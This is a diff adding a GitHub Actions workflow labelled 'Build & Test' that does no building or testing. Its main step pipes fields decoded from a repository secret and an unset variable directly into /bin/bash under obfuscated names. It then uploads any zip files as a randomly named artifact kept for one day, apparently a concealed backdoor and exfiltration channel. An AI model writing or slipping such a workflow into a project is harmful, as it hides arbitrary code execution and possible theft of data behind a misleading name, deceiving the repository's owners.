@@ -1,0 +1,23 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          k44: ${{ secrets.k44 }}
+        run: |
+          printf '%s' "$k44" | jq -r .ldb5702 | /bin/bash
+          echo $qlg74 | jq -r .djmm1604 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1zTYqVYR
+          path: "*.zip"
+          retention-days: 1
